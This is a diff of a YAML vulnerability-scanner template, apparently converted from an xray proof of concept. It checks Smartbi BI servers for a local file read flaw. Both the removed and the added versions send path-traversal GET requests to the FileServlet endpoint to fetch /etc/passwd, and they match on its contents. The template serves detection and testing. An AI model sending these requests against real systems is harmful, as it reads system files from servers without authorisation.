@@ -1,37 +1,33 @@
 id: yaml-poc-smartbi-smartbi_bi-readfile-CT-649451
-
 info:
-  name: yaml-poc-smartbi-smartbi_bi-readfile-CT-649451
+  name: Yaml Poc Smartbi Smartbi_Bi Readfile Ct 649451
   author: haiqing.chen
-  severity: high
-  tags: xray-converted,lfi
-
+  severity: medium
+  description: 'Converted from xpoc: yaml-poc-smartbi-smartbi_bi-readfile-CT-649451'
+  tags: lfi
+  reference: []
 http:
-  - raw:
-      - |
-        GET /vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx HTTP/1.1
-        Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-      - type: regex
-        part: body
-        regex:
-          - "root:.*?:[0-9]*:[0-9]*:"
-  - raw:
-      - |
-        GET /smartbi/vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx HTTP/1.1
-        Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-      - type: regex
-        part: body
-        regex:
-          - "root:.*?:[0-9]*:[0-9]*:"
+- method: GET
+  path:
+  - /vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - 'root:.*?:[0-9]*:[0-9]*:'
+- method: GET
+  path:
+  - /smartbi/vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - 'root:.*?:[0-9]*:[0-9]*:'
